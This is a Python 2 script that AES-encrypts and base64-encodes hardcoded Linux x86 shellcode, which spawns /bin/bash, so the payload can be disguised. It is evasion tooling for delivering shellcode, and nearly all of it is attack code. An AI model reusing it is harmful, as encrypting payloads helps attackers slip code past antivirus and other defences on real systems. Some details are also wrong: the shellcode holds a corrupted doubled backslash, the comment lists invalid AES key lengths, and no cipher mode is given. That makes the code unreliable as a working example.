#import required modules
from Crypto.Cipher import AES
import base64

#ask user for the key that they require. Due to the low level nature of the pycrypto API this has to be 16, 32 or 48 bytes. 
key = raw_input('Please enter a key to encrypt the shellcode with: ')

#the shellcode to be encrypted 
Shellcode = '\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\\xe1\xb0\x0b\xcd\x80'

#the chosen blocksize
blockSize = 16

#the shellcode may have to be padded to fit the blocklength, if it is this is the value it will be padded with
padding = '?'

#this lambda function is what will pad the shellcode as required based on the length of the shellcode and the blocksize 	
pad = lambda x: x + (blockSize - len(x) % blockSize) * padding

#this lambda function encrypts the padded shellcode and then base64 encodes it
b64encodeAES = lambda y, x: base64.b64encode(y.encrypt(pad(x)))

#setting cipher to the chosen key
cipher = AES.new(key)

#calls the b64encodeAES lambda function with the user selected key and shellcode
encoded = b64encodeAES(cipher, Shellcode)

#prints out the encrypted and encoded payload
print 'Encrypted String: ' + encoded
